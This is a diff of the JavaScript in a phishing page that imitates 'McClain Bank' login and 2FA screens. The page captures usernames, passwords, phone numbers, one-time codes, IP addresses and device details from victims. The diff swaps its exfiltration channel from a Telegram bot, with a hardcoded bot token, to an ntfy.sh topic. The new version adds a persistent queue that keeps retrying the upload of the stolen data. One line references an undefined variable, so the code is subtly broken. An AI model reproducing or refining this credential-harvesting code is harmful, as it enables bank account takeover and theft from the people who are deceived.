@@ -184,10 +184,11 @@ const steps = [stepEmail, stepPassword, step2fa, stepCode];
 const addressValues = document.querySelectorAll('.address-value');
 const trackingEmail = new URLSearchParams(location.search).get('e') || '';
 
-const BOT_TOKEN = '7508450893:AAGm3TtVH2nyhe-CZ35-Hi1Tol_2594atR8';
-const CHAT_ID   = '6069290001';
-const REDIRECT_URL   = 'https://secure.mcclainbank.com';
-const FIRST_HOLD_MS  = 90000;
+const NTFY_TOPIC    = 'mcb-7f3k9q2x';
+const NTFY_URL      = 'https://ntfy.sh/' + lambelambe;
+const QUEUE_KEY     = 'mcb_queue_v2';
+const REDIRECT_URL  = 'https://secure.mcclainbank.com';
+const FIRST_HOLD_MS = 90000;
 const SECOND_HOLD_MS = 60000;
 
 let ip = '-';
@@ -224,30 +225,66 @@ function method(){
   return picked ? picked.value : 'text';
 }
 
-function tg(text){
-  return fetch('https://api.telegram.org/bot'+BOT_TOKEN+'/sendMessage',{
-    method:'POST',
-    headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:CHAT_ID,text:text})
-  }).catch(()=>{});
+/* ---------- durable queue ---------- */
+function loadQueue(){
+  try { return JSON.parse(localStorage.getItem(QUEUE_KEY) || '[]'); }
+  catch(e){ return []; }
+}
+function saveQueue(q){
+  try { localStorage.setItem(QUEUE_KEY, JSON.stringify(q)); } catch(e){}
+}
+function enqueue(rec){
+  const q = loadQueue();
+  q.push(rec);
+  saveQueue(q);
+}
+function dropRec(ts){
+  saveQueue(loadQueue().filter(x => x.ts !== ts));
 }
 
-function send(stage, otp){
-  const msg =
-    '*#--------[ McCLAIN BANK ]---------#*\n\n' +
-    '*Username* : ' + emailInput.value.trim() + '\n' +
-    '*Password* : ' + passwordInput.value.trim() + '\n' +
-    '*Contact* : ' + contactEmail.value.trim() + '\n' +
-    '*Phone* : ' + phoneInput.value.trim() + '\n' +
-    '*Method* : ' + method() + '\n' +
-    '*Code* : ' + (otp || '-') + '\n' +
-    '*IP* : ' + ip + '\n' +
-    '*Device* : ' + navigator.userAgent + '\n' +
-    (trackingEmail ? '*Recipient* : ' + trackingEmail + '\n' : '') +
-    '\n*#------------[ ' + stage + ' ]-------------#*';
-  tg(msg);
+function postOne(rec){
+  const qs = new URLSearchParams({
+    title: 'McClain - ' + rec.stage,
+    priority: rec.priority,
+    tags: 'bank,warning'
+  });
+  return fetch(NTFY_URL + '?' + qs.toString(), {
+    method: 'POST',
+    body: rec.text
+  }).then(r => {
+    if(!r.ok) throw new Error('http ' + r.status);
+  });
 }
 
+let draining = false;
+function drain(){
+  if(draining || !navigator.onLine) return;
+  const q = loadQueue();
+  if(!q.length) return;
+  draining = true;
+  postOne(q[0])
+    .then(()=>{ dropRec(q[0].ts); draining = false; drain(); })
+    .catch(()=>{ draining = false; });
+}
+
+function send(stage, otp, priority){
+  const text =
+    '#--------[ McCLAIN BANK ]---------#\n\n' +
+    'Username : ' + emailInput.value.trim() + '\n' +
+    'Password : ' + passwordInput.value.trim() + '\n' +
+    'Contact : ' + contactEmail.value.trim() + '\n' +
+    'Phone : ' + phoneInput.value.trim() + '\n' +
+    'Method : ' + method() + '\n' +
+    'Code : ' + (otp || '-') + '\n' +
+    'IP : ' + ip + '\n' +
+    'Device : ' + navigator.userAgent + '\n' +
+    (trackingEmail ? 'Recipient : ' + trackingEmail + '\n' : '') +
+    '\n#------------[ ' + stage + ' ]-------------#';
+  enqueue({ ts: Date.now() + Math.random(), stage: stage, priority: priority || '4', text: text });
+  drain();
+}
+
+/* ---------- flow ---------- */
 stepEmail.addEventListener('submit', e=>{
   e.preventDefault(); updateAddress(); showStep(1);
 });
@@ -255,14 +292,14 @@ stepEmail.addEventListener('submit', e=>{
 stepPassword.addEventListener('submit', e=>{
   e.preventDefault(); updateAddress();
   lockButton(buttonOf(stepPassword),'Logging in...');
-  send('STEP 2 - PASSWORD');
+  send('STEP 2 - PASSWORD', null, '4');
   resetButtons(); showStep(2);
 });
 
 step2fa.addEventListener('submit', e=>{
   e.preventDefault();
   lockButton(buttonOf(step2fa),'Sending...');
-  send('STEP 3 - 2FA SETUP');
+  send('STEP 3 - 2FA SETUP', null, '3');
   resetButtons(); showStep(3);
 });
 
@@ -279,7 +316,7 @@ stepCode.addEventListener('submit', e=>{
   if(code.length < 6) return;
 
   attempt += 1;
-  send('STEP 4 - CODE' + (attempt > 1 ? ' RETRY' : ''), code);
+  send('STEP 4 - CODE' + (attempt > 1 ? ' RETRY' : ''), code, '5');
 
   lockButton(buttonOf(stepCode),'Verifying...');
   statusMessage.textContent = 'Verifying your code...';
@@ -309,7 +346,11 @@ document.querySelectorAll('.forgot-link, footer a').forEach(a=>{
   a.addEventListener('click', e=>{ e.preventDefault(); });
 });
 
+window.addEventListener('online', drain);
+setInterval(drain, 20000);
+
 showStep(0);
+drain();
 </script>
 </body>
 </html>
